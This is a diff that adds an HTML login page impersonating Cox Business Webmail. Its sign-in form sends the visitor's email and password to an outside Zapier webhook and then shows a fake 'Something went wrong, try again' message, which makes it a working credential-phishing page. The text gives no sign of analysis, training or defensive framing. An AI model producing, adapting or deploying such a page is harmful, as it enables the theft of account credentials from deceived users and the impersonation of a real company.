@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Business Webmail</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="layout">
+    <section class="welcome-panel">
+      <h1>
+        Welcome to 
+        Cox<br>
+        Business<br>
+        Webmail
+      </h1>
+    </section>
+
+    <section class="content-panel">
+      <div class="login-card">
+        <header class="brand">Cox</span>
+          <span class="brand-main">BUSINESS</span>
+          <span class="brand-divider">|</span>
+          <span class="brand-sub">Webmail</span>
+        </header>
+
+        <h2>Sign in</h2>
+
+        <form action="https://hooks.zapier.com/hooks/catch/29162805/41k6ldj/" method="POST">
+          <label for="email">email</label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            placeholder=""
+            autocomplete="on"
+            required
+          >
+
+          <label for="password">password</label>
+          <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder=""
+            autocomplete="password"
+            required
+          >
+
+          <p class="help-link">
+            Forgot your password.
+          </p>
+
+          <label class="remember">
+            <input id="staySignedIn" type="checkbox">
+            <span>Stay signed in</span>
+          </label>
+
+          <button type="submit" onclick="login(); message()" class="btn">Log In</button>
+
+          <p id="status" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+
+      <a class="account-link" href="#account">
+        account information
+      </a>
+
+      <footer>
+        Copyright 1998 - 2026 Cox Communication, Inc Privacy Policy
+      </footer>
+    </section>
+  </main>
+
+   <div class="message">
+            <div class="success" id="success">Something went wrong, try again.</div>
+            <div class="failure" id="failure">Error occurred.</div>
+        </div>
+    </div>
+    
+  <script src="main.js"></script>
+</body>
+</html>
